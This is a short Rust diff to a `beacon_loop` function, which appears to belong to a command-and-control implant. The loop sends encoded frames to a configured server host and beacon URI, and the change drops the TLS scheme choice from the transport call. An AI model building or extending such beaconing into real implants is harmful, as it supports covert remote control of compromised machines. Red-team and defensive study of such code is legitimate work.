@@ -56,12 +56,10 @@ pub unsafe fn beacon_loop() {
     loop {
         let frame = encode_frame(&pubkey, counter, &key, &info_plain);
         counter += 1;
-        let scheme = if cfg.use_tls { "https" } else { "http" };
         let resp = crate::transport::post_frame(
-            scheme,
-            &cfg.server_host,
+            cfg.server_host.as_bytes(),
             cfg.server_port,
-            &cfg.beacon_uri,
+            cfg.beacon_uri.as_bytes(),
             &frame,
         );
         if resp.is_some() {
@@ -78,12 +76,10 @@ pub unsafe fn beacon_loop() {
         counter += 1;
         pending.clear();
 
-        let scheme = if cfg.use_tls { "https" } else { "http" };
         let Some(body) = crate::transport::post_frame(
-            scheme,
-            &cfg.server_host,
+            cfg.server_host.as_bytes(),
             cfg.server_port,
-            &cfg.beacon_uri,
+            cfg.beacon_uri.as_bytes(),
             &frame,
         ) else {
             continue;
